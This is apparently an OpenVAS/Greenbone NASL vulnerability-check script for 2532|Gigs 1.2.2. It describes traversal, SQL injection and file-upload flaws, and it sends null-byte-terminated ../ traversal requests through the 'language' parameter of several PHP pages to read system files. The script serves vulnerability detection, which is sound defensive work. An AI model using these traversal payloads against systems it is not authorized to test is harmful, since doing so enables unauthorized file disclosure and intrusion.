# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:2532gigs:2532gigs";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800682");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2009-08-20 09:27:17 +0200 (Thu, 20 Aug 2009)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2008-6901", "CVE-2008-6902", "CVE-2008-6907");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("2532|Gigs <= 1.2.2 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_2532gigs_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("2532_gigs/http/detected");

  script_tag(name:"summary", value:"2532-Gigs is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP GET requests and checks the responses.");

  script_tag(name:"insight", value:"- Vulnerability exists in activateuser.php, manage_venues.php,
  mini_calendar.php, deleteuser.php, settings.php, and manage_gigs.php files when input passed to
  the 'language' parameter is not properly verified before being used to include files via a ..
  (dot dot).

  - Input passed to the 'username' and 'password' parameters in checkuser.php is not properly
  sanitised before being used in SQL queries.

  - Error in upload_flyer.php which can be exploited by uploading a file with an executable
  extension, then accessing it via a direct request to the file in flyers/.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to cause directory
  traversal or SQL injection attacks, and can execute arbitrary code when register_globals is
  enabled and magic_quotes_gpc is disabled.");

  script_tag(name:"affected", value:"2532-Gigs version 1.2.2 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://milw0rm.com/exploits/7511");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/32911");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/32913");
  script_xref(name:"URL", value:"http://milw0rm.com/exploits/7510");
  script_xref(name:"URL", value:"http://secunia.com/advisories/26585");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

attacks = make_list("/deleteuser.php?language=../../../../../../../../../../",
                    "/settings.php?language=../../../../../../../../../../",
                    "/mini_calendar?language=../../../../../../../../../../",
                    "/manage_venues.php?language=../../../../../../../../../../",
                    "/manage_gigs.php?language=../../../../../../../../../../");

files = traversal_files();

foreach pattern (keys(files)) {
  file = files[pattern];

  foreach attack (attacks) {
    url = dir + attack + file + "%00";

    if (http_vuln_check(port: port, url: url, pattern: pattern, icase: FALSE)) {
      report = http_report_vuln_url( port: port, url: url);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(0);
